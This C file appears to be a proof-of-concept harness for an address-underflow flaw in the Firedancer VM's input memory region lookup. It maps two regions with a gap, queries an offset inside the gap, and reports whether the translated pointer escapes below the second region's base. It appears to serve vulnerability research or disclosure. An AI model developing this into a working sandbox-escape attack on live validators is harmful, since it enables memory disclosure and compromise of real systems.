#include <stdio.h>
#include <assert.h>
#include "flamenco/vm/fd_vm_private.h"

int main(void) {
    printf("[OUROBOROS-FD-VM-01] Firedancer VM Native C5-REAL Verification\n");

    // We simulate the structure but using real Firedancer types
    fd_vm_input_region_t regions[2];
    
    // Sandbox memory mock
    uchar sandbox_mem[8192];
    memset(sandbox_mem, 0x00, 8192);

    // Setup fragmented regions
    // Region 0: [0, 100)
    regions[0].haddr = (ulong)sandbox_mem;
    regions[0].vaddr_offset = 0;
    regions[0].region_sz = 100;
    regions[0].address_space_reserved = 100;
    regions[0].is_writable = 1;

    // Region 1: [4096, 4196)
    // Gap: [100, 4096)
    regions[1].haddr = (ulong)(sandbox_mem + 4096);
    regions[1].vaddr_offset = 4096;
    regions[1].region_sz = 100;
    regions[1].address_space_reserved = 100;
    regions[1].is_writable = 1;

    fd_vm_t vm;
    vm.input_mem_regions_cnt = 2;
    vm.input_mem_regions = regions;
    vm.virtual_address_space_adjustments = 1; // Explicitly enable adjustments logic

    ulong sentinel = 0xDEADBEEF;
    ulong exploit_offset = 2048; // In the gap
    ulong sz = 1;

    printf("Executing fd_vm_find_input_mem_region with offset %lu...\n", exploit_offset);
    
    ulong result_haddr = fd_vm_find_input_mem_region(&vm, exploit_offset, sz, 0, sentinel);

    printf("Result Haddr: %p\n", (void*)result_haddr);
    
    // The expected underflow result is:
    // regions[1].haddr + 2048 - 4096 = regions[1].haddr - 2048
    // which is sandbox_mem + 4096 - 2048 = sandbox_mem + 2048
    
    if (result_haddr == sentinel) {
        printf("RESULT: Safe (Vulnerability not triggered)\n");
        return 1;
    } else {
        printf("RESULT: VULNERABLE! Translated address points to %p\n", (void*)result_haddr);
        ulong expected_leak = regions[1].haddr + exploit_offset - regions[1].vaddr_offset;
        if (result_haddr == expected_leak) {
            printf("CONFIRMED: Mathematical match with underflow vector.\n");
        }
        
        // Final check: did it escape the intended region 1?
        if (result_haddr < regions[1].haddr) {
            printf("CRITICAL: Pointer underflowed Region 1 base!\n");
        }
        
        return 0; // Success (Vulnerability proven)
    }
}
